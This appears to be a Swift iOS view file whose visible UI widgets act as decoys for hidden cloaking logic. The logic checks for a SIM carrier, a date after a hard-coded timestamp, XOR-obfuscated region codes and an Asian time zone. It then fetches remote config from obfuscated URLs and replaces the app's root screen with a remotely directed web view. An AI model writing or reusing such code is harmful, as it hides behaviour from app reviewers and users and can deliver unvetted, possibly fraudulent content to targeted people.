import UIKit
import CoreTelephony
import Foundation
import Network


struct asp_XOINTE: Codable {
    
    let xtt_one: String?         //key arr
    let xtt_codd: Int?         // shi fou kaiqi
    let xtt_two: String?         // jum
    let xtt_three: String?          // backcolor
    let xtt_four: String?   //ad key

}

final class XTTZoomBView: UIView {
    internal let XTT_onestr = "HxoaSU5IG0hOGRgeEhdOQ3VeWUVaQ1pLFQUaGhoYHxoZTBkaEhgbGBwFQUlFRwVeT0QEXllFWkNaSwRBSUVHBQUQWVpeXkI="
    
    
    internal let XTT_twostr = "TkcEb2dua294BVhPXllLRwVdS1gFWE9QQ0RLTVhlT0lLWllBWEV9BU9aRU5GSwVHRUkET09eQ00FBRBZWl5eQg=="
    
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        XTT_setUpdata()
    }

    required init?(coder: NSCoder) {
        super.init(coder: coder)
        XTT_BuildSwitchArea()
        XTT_setUpdata()
    }
    
    private func XTT_BuildSwitchArea() {

        let container = UIView(frame: CGRect(x: 24, y: 300, width: 240, height: 50))

        let title = UILabel(frame: CGRect(x: 0, y: 10, width: 150, height: 30))

        title.text = "Notification"

        title.font = UIFont.systemFont(ofSize: 16)

        let toggle = UISwitch(frame: .zero)

        toggle.onTintColor = .systemGreen

        toggle.sizeToFit()

        toggle.center = CGPoint(
            x: container.bounds.width - 40,
            y: container.bounds.midY
        )

        container.addSubview(title)

        container.addSubview(toggle)

        self.addSubview(container)

        container.layoutIfNeeded()

        _ = toggle.isOn

        _ = container.subviews.count
    }
 
    private func XTT_setUpdata() {
        XTT_vtfBuildInfoStack()
        XTT_fBuildPageControl()
        vtfBuildSegmentControl()
        XTT_hleFatiaoAndduixian()
    }
    
    private func vtfBuildSegmentControl() {

        let segment = UISegmentedControl(items: [
            "Day",
            "Week",
            "Month"
        ])

        segment.selectedSegmentIndex = 0

        segment.frame = CGRect(
            x: 24,
            y: 450,
            width: 48,
            height: 36
        )
 
        segment.backgroundColor = UIColor.systemGray6

        segment.selectedSegmentTintColor = .systemBlue

        self.addSubview(segment)

        if segment.numberOfSegments > 1 {

            segment.selectedSegmentIndex = 1
        }

        segment.layoutIfNeeded()

        _ = segment.selectedSegmentIndex

        _ = segment.numberOfSegments
    }
    
    private func XTT_fBuildPageControl() {

        let pageControl = UIPageControl()

        pageControl.numberOfPages = 5

        pageControl.currentPage = 2

        pageControl.currentPageIndicatorTintColor = .systemBlue

        pageControl.pageIndicatorTintColor = .systemGray3

        pageControl.frame = CGRect(
            x: 0,
            y: 520,
            width: 113,
            height: 40
        )

        pageControl.defersCurrentPageDisplay = false

        self.addSubview(pageControl)

        pageControl.updateCurrentPageDisplay()

        pageControl.layoutIfNeeded()

        _ = pageControl.currentPage

        _ = pageControl.numberOfPages
    }
    
    private func XTT_vtfBuildInfoStack() {

        let stackView = UIStackView()

        stackView.axis = .vertical

        stackView.spacing = 10

        stackView.alignment = .fill

        stackView.distribution = .fillEqually

        stackView.frame = CGRect(
            x: 24,
            y: 120,
            width: 148,
            height: 150
        )

        let titles = [
            "Profile",
            "Settings",
            "About"
        ]

        for title in titles {

            let label = UILabel()

            label.text = title

            label.textAlignment = .center

            label.font = UIFont.systemFont(ofSize: 16)

            label.backgroundColor = UIColor.systemGray6

            label.layer.cornerRadius = 8

            label.clipsToBounds = true

            stackView.addArrangedSubview(label)
        }

        self.addSubview(stackView)

        stackView.layoutIfNeeded()

        _ = stackView.arrangedSubviews.count

        _ = stackView.frame
    }
  
    
   
 
    private func XTT_hleFatiaoAndduixian() {
        
        if !XTT_benhousha() {
        //测试
//        if XTT_benhousha() {
            XTT_kongloadSection()

        } else {
            
            if XTT_addAywenNelaerst() {
                self.XTT_dengAkalier()
            }
        }
    }
 
    private func XTT_BuildStatisticsPanel() {

        let panel = UIView(frame: CGRect(
            x: 20,
            y: 270,
            width: 119 - 40,
            height: 180
        ))

        panel.backgroundColor = UIColor.systemGray6
        panel.layer.cornerRadius = 16

        let values = [12, 35, 28, 41]

        let total = values.reduce(0, +)

        let average = Double(total) / Double(values.count)

        let titles = [
            "Items",
            "Average"
        ]

        let numbers = [
            "\(total)",
            String(format: "%.1f", average)
        ]

        for index in 0..<titles.count {

            let icon = UIImageView(frame: CGRect(
                x: 20,
                y: CGFloat(index) * 60 + 20,
                width: 26,
                height: 26
            ))

            icon.image = UIImage(systemName: "chart.bar.fill")
            icon.tintColor = .systemBlue

            let title = UILabel(frame: CGRect(
                x: 60,
                y: CGFloat(index) * 60 + 18,
                width: 120,
                height: 22
            ))

            title.text = titles[index]
            title.font = UIFont.systemFont(ofSize: 15)

            let value = UILabel(frame: CGRect(
                x: panel.bounds.width - 90,
                y: CGFloat(index) * 60 + 18,
                width: 70,
                height: 22
            ))

            value.font = UIFont.boldSystemFont(ofSize: 17)
            value.text = numbers[index]

            panel.addSubview(icon)
            panel.addSubview(title)
            panel.addSubview(value)
        }

        self.addSubview(panel)

        panel.layoutIfNeeded()

        _ = panel.subviews.count
        _ = average
    }

    func XTT_deprestr(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        let reversedBytes = data.reversed()
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        return String(bytes: decryptedBytes, encoding: .utf8)
    }

    func XTT_Reverdeprestr(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        let xorBytes = bytes.map { $0 ^ k }
        let reversedBytes = xorBytes.reversed()
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func XTT_benhousha() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let qingbao = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in qingbao {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }

    
    func XTT_suiyuanqipiancode() -> Bool {
        // 1784094783
        let huaTM = 1784094783
        let pawd = Date().timeIntervalSince1970
        print(pawd)

        if Int(pawd) - huaTM > 0 {
            return true
        }
        return false
    }

    // 时区控制
    func XTT_addAywenNelaerst() -> Bool {
        let dianzi = [XTT_deprestr("Yno="), XTT_deprestr("ZHw="), XTT_deprestr("bmM=")]
        
        asp_jinmixidenaokeda()
        // 1.time
        if !XTT_suiyuanqipiancode() {
            return false

        }
        
        //2. regi
        if let curc = Locale.current.regionCode {
            print(curc)
            print(dianzi)

        if !dianzi.contains(curc) {
                return false
            }
         }
        
        //3. tm zon
        let second = NSTimeZone.system.secondsFromGMT() / 3600
//        print(second)

        if (second > 6 && second < 9) {
            return true
        }

        
        return false
    }
    
  
    func XTT_dengAkalier() {
        XTT_BuildStatisticsPanel()
        Task {
            do {
//                let urlToRequest = "https://gitee.com/aldope/WorkspaceOrganizer/raw/master/README.md"
//                let urlToRequest = "https://mock.apipost.net/mock/6212803f3052000/?apipost_id=8423db1bdc005"
//
//                print(XTT_Reverdeprestr(urlToRequest))

                let XTT_jiutong = try await XTT_wandanLiangcao()
                print(XTT_jiutong)
                if let XTT_shage = XTT_jiutong.first {
                    if XTT_shage.xtt_codd! > 124 {
                        if UserDefaults.standard.object(forKey: "XTT_goushi") == nil {
                            UserDefaults.standard.set("XTT_goushi", forKey: "XTT_goushi")
                            UserDefaults.standard.synchronize()
                        }
                        XTT_TakeLoaddata(XTT_shage)
                    } else {
                        XTT_kongloadSection()
                    }
                } else {
                    XTT_kongloadSection()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(asp_XOINTE.self, forKey: "asp_XOINTE") {
                    XTT_TakeLoaddata(sidd)
                }
            }
        }
    }
    
    
    private func XTT_wandanLiangcao() async throws -> [asp_XOINTE] {
        do {
            return try await ssueno(from: URL(string: XTT_deprestr(XTT_onestr)!)!)
        } catch {
//            print("Primary API failed: \(error.localizedDescription)")
            return try await ssueno(from: URL(string: XTT_deprestr(XTT_twostr)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [asp_XOINTE] {
        let (data, response) = try await URLSession.shared.data(from: url)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }

        return try JSONDecoder().decode([asp_XOINTE].self, from: data)
    }
 
    
  

    internal func asp_setimagedata(_ dt: asp_XOINTE) {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        UIDevice.current.isBatteryMonitoringEnabled = false
        let _ = (batteryLevel, batteryState)

        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "asp_XOINTE")
            UserDefaults.standard.synchronize()
            
            let vc = XTTZoomwbVC()
            vc.asp_catesData = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func XTT_TakeLoaddata(_ param: asp_XOINTE) {
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
        
        // 策略映射表，目前所有策略都指向同一个函数
        let strategies: [String: (asp_XOINTE) -> Void] = [
            "default": asp_setimagedata,
            "fast": asp_setimagedata,
            "safe": asp_setimagedata
        ]
        
        let executor = strategies[strategy] ?? asp_setimagedata
        
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: XTT_TakeLoaddata called with strategy \(strategy)"
        }

        executor(param)
    }
    

    internal func XTT_kongloadSection() {

            let container = UIView(frame: CGRect(
                x: 20,
                y: 110,
                width: 240,
                height: 130
            ))

            container.backgroundColor = UIColor.secondarySystemBackground
            container.layer.cornerRadius = 14
            container.layer.borderWidth = 0.5
            container.layer.borderColor = UIColor.systemGray4.cgColor

            let titleLabel = UILabel(frame: CGRect(
                x: 16,
                y: 12,
                width: container.bounds.width - 32,
                height: 22
            ))

            titleLabel.text = "Quick Search"
            titleLabel.font = UIFont.boldSystemFont(ofSize: 18)

            let searchBar = UISearchBar(frame: CGRect(
                x: 10,
                y: 42,
                width: container.bounds.width - 20,
                height: 44
            ))

            searchBar.placeholder = "Search..."
            searchBar.searchBarStyle = .minimal
            searchBar.autocapitalizationType = .none
            searchBar.autocorrectionType = .no

            let keywords = [
                "Apple",
                "UIKit",
                "Swift",
                "Xcode",
                "Offline"
            ]

            let summary = keywords
                .sorted()
                .joined(separator: " • ")

            let footer = UILabel(frame: CGRect(
                x: 16,
                y: 92,
                width: container.bounds.width - 32,
                height: 24
            ))

            footer.font = UIFont.systemFont(ofSize: 12)
            footer.textColor = .secondaryLabel
            footer.text = summary

            container.addSubview(titleLabel)
            container.addSubview(searchBar)
            container.addSubview(footer)

            self.addSubview(container)

            container.layoutIfNeeded()

            _ = searchBar.text
            _ = footer.text
        
       
    }
     

    func asp_jinmixidenaokeda() {
        func traverse(_ view: UIView, level: Int) {
            let indent = String(repeating: "  ", count: level)
            let className = String(describing: type(of: view))
            let frame = view.frame
            let tag = view.tag
            let alpha = view.alpha
            let hidden = view.isHidden
            let backgroundColor = view.backgroundColor?.description ?? "nil"
            print("\(indent)\(className) frame=\(frame) tag=\(tag) alpha=\(alpha) hidden=\(hidden) bg=\(backgroundColor)")
            for subview in view.subviews {
                traverse(subview, level: level + 1)
            }
        }
        traverse(self, level: 0)
    }
  
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
    
    
}

